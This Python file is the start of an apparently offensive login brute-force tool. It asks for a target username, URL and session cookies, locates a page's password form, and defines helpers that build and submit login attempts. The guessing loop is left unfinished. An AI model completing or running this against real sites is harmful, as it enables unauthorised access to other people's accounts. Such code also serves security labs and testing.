import sys
import os
import requests
from bs4 import BeautifulSoup

from importmonkey import add_path

''' Export python module path '''

_i = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _i not in sys.path:
    add_path(_i)

from toolbox.print.banner import *
from toolbox.print.clprinter import *

print_horizontal_delimiter()

mode_input = int(input("# Step 1: Select mode\n"
                       "# You want to attack ONE specific username - type 1\n"
                       "# You don't know a specific username to attack - type 2\n"))


def find_authentication_form(url, cookies=None):
    response = requests.get(url, cookies=cookies)
    soup = BeautifulSoup(response.content, 'html.parser')
    form = None
    for input_field in soup.find_all('input'):
        if input_field.get('type') == 'password':
            form = input_field.find_parent('form')
            break
    if form:
        action = form['action']
        method = form.get('method', 'post')
        inputs = form.find_all('input')
        return (action, method, inputs)
    return None

def forge_payload(inputs, username, password):
    payload = {}
    for inp in inputs:
        if inp.get('type') != 'submit':
            payload[inp['name']] = inp.get('value', '')
    payload['username'] = username
    payload['password'] = password

    return payload

def attempt_login(action, method, payload, cookies=None):
    if method == 'post':
        response = requests.post(action, data=payload, cookies=cookies)
    else:
        response = requests.get(action, params=payload, cookies=cookies)
    return response


def do_cmok():
    print_horizontal_delimiter()
    print_cmok_banner()
    print_horizontal_delimiter()
    username = input("# Step 2: Type username to attack\n")
    url = input("# Step 3: Copy and paste URL of a page you're attacking\n")
    cookies = input("# Step 4: Type in necessary cookies to access the URL, separated with \';\'. If not present, leave as empty\n"
                    "# ex. security=high; PHPSESSID=9943c85c5c1779e8b78c3fb17f20d513\n"
                    "# To view cookies in Chrome, go Inspect->Application->Cookies\n")
    form = find_authentication_form(url, cookies)
    if form:
        pass
    else:
        print("# Auth form not detected, exiting...")

if (mode_input == 1):
    do_cmok()
elif (mode_input == 2):
    pass
